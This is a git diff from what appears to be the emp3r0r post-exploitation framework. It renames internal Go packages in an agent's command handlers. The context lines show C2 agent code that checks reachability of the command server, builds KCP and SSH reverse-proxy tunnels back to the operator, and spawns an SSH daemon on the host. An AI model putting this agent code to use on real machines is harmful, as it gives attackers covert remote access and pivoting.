@@ -12,9 +12,9 @@ import (
 	"strings"
 	"time"
 
-	"github.com/jm33-m0/emp3r0r/core/internal/emp3r0r_def"
-	"github.com/jm33-m0/emp3r0r/core/internal/tun"
-	"github.com/jm33-m0/emp3r0r/core/lib/emp3r0r_crypto"
+	"github.com/jm33-m0/emp3r0r/core/internal/def"
+	"github.com/jm33-m0/emp3r0r/core/internal/transport"
+	"github.com/jm33-m0/emp3r0r/core/lib/crypto"
 	"github.com/jm33-m0/emp3r0r/core/lib/listener"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 	"github.com/spf13/cobra"
@@ -75,7 +75,7 @@ func runStat(cmd *cobra.Command, args []string) {
 	fstat := &util.FileStat{
 		Name:       util.FileBaseName(path),
 		Size:       fi.Size(),
-		Checksum:   emp3r0r_crypto.SHA256SumFile(path),
+		Checksum:   crypto.SHA256SumFile(path),
 		Permission: fi.Mode().String(),
 	}
 	data, err := json.Marshal(fstat)
@@ -97,8 +97,8 @@ func runBring2CC(cmd *cobra.Command, args []string) {
 	useKCP := kcp == "on"
 	msg := fmt.Sprintf("Bring2CC: Reverse proxy for %s finished\n", addr)
 
-	hasInternet := tun.TestConnectivity(emp3r0r_def.CCAddress, RuntimeConfig.C2TransportProxy)
-	isProxyOK := tun.IsProxyOK(RuntimeConfig.C2TransportProxy, emp3r0r_def.CCAddress)
+	hasInternet := transport.TestConnectivity(def.CCAddress, RuntimeConfig.C2TransportProxy)
+	isProxyOK := transport.IsProxyOK(RuntimeConfig.C2TransportProxy, def.CCAddress)
 	if !hasInternet && !isProxyOK {
 		C2RespPrintf(cmd, "Error: We don't have any internet to share\n")
 		return
@@ -114,7 +114,7 @@ func runBring2CC(cmd *cobra.Command, args []string) {
 	if useKCP {
 		targetAddrWithPort = fmt.Sprintf("127.0.0.1:%s", kcpListenPort)
 		kcpServerAddr := fmt.Sprintf("%s:%s", addr, RuntimeConfig.KCPServerPort)
-		go tun.KCPTunClient(kcpServerAddr, kcpListenPort, RuntimeConfig.Password, emp3r0r_def.MagicString, ctx, cancel)
+		go transport.KCPTunClient(kcpServerAddr, kcpListenPort, RuntimeConfig.Password, def.MagicString, ctx, cancel)
 		util.TakeABlink()
 	}
 	proxyPort, err := strconv.Atoi(RuntimeConfig.AgentSocksServerPort)
@@ -123,7 +123,7 @@ func runBring2CC(cmd *cobra.Command, args []string) {
 		cancel()
 		return
 	}
-	err = tun.SSHReverseProxyClient(targetAddrWithPort, RuntimeConfig.Password, proxyPort, &ReverseConns, emp3r0r_def.ProxyServer, ctx, cancel)
+	err = transport.SSHReverseProxyClient(targetAddrWithPort, RuntimeConfig.Password, proxyPort, &ReverseConns, def.ProxyServer, ctx, cancel)
 	if err != nil {
 		C2RespPrintf(cmd, "%v\n", err)
 		return
@@ -145,7 +145,7 @@ func runSSHD(cmd *cobra.Command, args []string) {
 	go func() {
 		errChan <- SSHD(shell, port, sshdArgs)
 	}()
-	for !tun.IsPortOpen("127.0.0.1", port) {
+	for !transport.IsPortOpen("127.0.0.1", port) {
 		time.Sleep(50 * time.Millisecond)
 	}
 	select {
